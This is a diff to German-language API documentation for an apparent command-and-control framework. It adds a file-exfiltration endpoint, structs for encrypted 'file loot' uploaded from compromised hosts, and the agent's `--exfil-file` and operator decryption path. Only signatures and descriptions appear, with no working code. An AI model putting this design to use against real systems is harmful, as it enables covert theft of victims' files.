@@ -46,6 +46,7 @@ Agent und CLI sprechen dieselben Typen und dieselben Endpunktpfade.
 - `pub const PATH_TASKS: &str = "/api/tasks";` [c2.rs:PATH_TASKS]
 - `pub const PATH_TASKS_CREATE: &str = "/api/tasks/new";` [c2.rs:PATH_TASKS_CREATE]
 - `pub const PATH_TASKS_RESULT: &str = "/api/tasks/result";` [c2.rs:PATH_TASKS_RESULT]
+- `pub const PATH_FILES: &str = "/api/files";` [c2.rs:PATH_FILES] — Upload (POST) und Liste (GET) der KXENC-Datei-Container; der Server dedupliziert je `(host_id, file_id)`
 - `pub const STATUS_DISCOVERED: &str = "discovered";` [c2.rs:STATUS_DISCOVERED]
 - `pub const STATUS_COMPROMISED: &str = "compromised";` [c2.rs:STATUS_COMPROMISED]
 - `pub const STATUS_AGENT: &str = "agent";` [c2.rs:STATUS_AGENT]
@@ -66,6 +67,9 @@ Agent und CLI sprechen dieselben Typen und dieselben Endpunktpfade.
 - `impl ExfiltratedSecret` mit `mit_passwort(wert: &str)` und `mit_versiegeltem_passwort(wert: String)` — dieselbe Regel: die Helfer leeren sich gegenseitig [c2.rs:ExfiltratedSecret]
 - `pub struct CreateTaskRequest` (`host_id`, `command` als `String`), ohne `deny_unknown_fields` [c2.rs:CreateTaskRequest]
 - `pub struct TaskResultRequest` (`task_id`, `status`, `result` als `String`), ohne `deny_unknown_fields` [c2.rs:TaskResultRequest]
+- `pub struct FileUpload` (`host_id`, `file_id`, `filename`, `container`, `sealed_master` als `String`; `plain_size: u64`), ohne `deny_unknown_fields`; `sealed_master` mit `#[serde(default)]` — der Schluessel reist mit der Datei (ADR-0005) [c2.rs:FileUpload]
+- `pub struct ExfiltratedFile` (`id`, `host_id`, `file_id`, `filename`, `container`, `sealed_master`, `collected_at` als `String`; `plain_size: u64`), mit `#[serde(deny_unknown_fields)]` [c2.rs:ExfiltratedFile]
+- `pub const ExfiltratedFile::FIELDS: &[&str]` — die Feldnamen der Datei [c2.rs:ExfiltratedFile::FIELDS]
 
 ### c2/transport.rs — der Transport des C2-Protokolls
 
@@ -181,6 +185,11 @@ keinen zweiten Schluesselkanal.
 - `pub const CHUNK_SIZE: u32 = 64 * 1024;` [kxenc.rs:CHUNK_SIZE]
 - `pub fn seal(klartext: &[u8], master_key: &[u8], kex: KexId) -> Result<Vec<u8>>` [kxenc.rs:seal]
 - `pub fn open(container: &[u8], master_key: &[u8]) -> Result<Vec<u8>>` [kxenc.rs:open]
+- `pub fn file_id_hex(container: &[u8]) -> Result<String>` [kxenc.rs:file_id_hex] — die Datei-Kennung aus dem Fuss, hex-kodiert; der Agent meldet sie, der Server dedupliziert mit ihr
+
+Aufrufer: der Agent versiegelt Datei-Beute in `kx-agent/src/datei.rs`
+(`--exfil-file`), der Operator öffnet sie mit `kx-cli file-open`
+(`kx-cli/src/decrypt.rs:Decryptor::decrypt_file`).
 
 ### codec.rs — die Textkodierungen
 
